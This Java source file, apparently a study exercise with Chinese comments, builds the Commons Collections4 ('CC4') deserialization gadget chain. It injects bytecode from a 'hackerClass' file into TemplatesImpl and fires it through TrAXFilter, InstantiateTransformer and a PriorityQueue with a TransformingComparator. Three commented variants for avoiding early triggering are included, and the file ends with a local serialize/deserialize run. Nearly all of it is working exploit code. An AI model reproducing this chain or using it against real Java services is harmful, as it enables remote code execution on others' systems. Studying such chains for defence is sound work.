package cc4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import toolkit.Seriliazation;


import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class CC4Chain {
    private static String bytecodePath = "target/classes/cc4/hackerClass.class";
    public static void main(String[] args) throws Exception {
        cc4();
    }

    /**
     * cc4 版本上的利用链
     */
    public static void cc4() throws Exception {
        /**
         * cc3 的后半段，动态类加载
         */

        // 需要满足的约束：_name, _bytecodes, _tfactory
        TemplatesImpl templates = new TemplatesImpl();
        Class clazz_templatesImpl = templates.getClass();

        // 赋值
        Field fieldName = clazz_templatesImpl.getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templates, "aaa");;

        Field fieldBytecodes = clazz_templatesImpl.getDeclaredField("_bytecodes");
        fieldBytecodes.setAccessible(true);
        byte[][] bytecodes = new byte[][]{
                Files.readAllBytes(Paths.get(bytecodePath))
        };
        fieldBytecodes.set(templates,  bytecodes);

        Field fieldTfactory = clazz_templatesImpl.getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templates, new TransformerFactoryImpl());


        Transformer[] transformers = new Transformer[] {
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        /**
         * cc4 自己的前半段
         */

        /**
         * 方案 1：改 size 防止提前触发
         */
        PriorityQueue priorityQueue = new PriorityQueue(new TransformingComparator(chainedTransformer, new CustomComparator()));
        Class clazzPriorityQueue = priorityQueue.getClass();
        Field fieldSizeField = clazzPriorityQueue.getDeclaredField("size");
        fieldSizeField.setAccessible(true);
        Field fieldInitialCapacity = clazzPriorityQueue.getDeclaredField("DEFAULT_INITIAL_CAPACITY");
        fieldInitialCapacity.setAccessible(true);
        fieldSizeField.set(priorityQueue, fieldInitialCapacity.get(clazzPriorityQueue));

        /**
         * 方案 2：正常扩容，但是使用反射赋值 Comparator 防止比较，绕开触发
         */
//        PriorityQueue priorityQueue = new PriorityQueue();
//        for (int i = 0; i < 10; i++) {
//            priorityQueue.add(1);
//        }
//
//        Class clazzPriorityQueue = priorityQueue.getClass();
//        Field fieldComparator = clazzPriorityQueue.getDeclaredField("comparator");
//        fieldComparator.setAccessible(true);
//        fieldComparator.set(priorityQueue, new TransformingComparator(chainedTransformer, new CustomComparator()));

        /**
         * 方案 3：正常扩容，但是使用反射赋值 Transformer
         */
//        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1), new CustomComparator());
//        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
//        for (int i = 0; i < 10; i++) {
//            priorityQueue.add(1);
//        }
//
//        Class clazzTransformingComparator = TransformingComparator.class;
//        Field fieldTransformer = clazzTransformingComparator.getDeclaredField("transformer");
//        fieldTransformer.setAccessible(true);
//        fieldTransformer.set(transformingComparator, chainedTransformer);

        Seriliazation.serialize(priorityQueue);
        Seriliazation.unserialize("ser.bin");
    }


    // 自定义 Comparator 来处理转换后的元素比较
    public static class CustomComparator implements Comparator<Object>, Serializable {
        @Override
        public int compare(Object o1, Object o2) {
            // 这里实现自定义的比较逻辑
            // 例如，比较对象的哈希码
            return Integer.compare(o1.hashCode(), o2.hashCode());
        }
    }

}
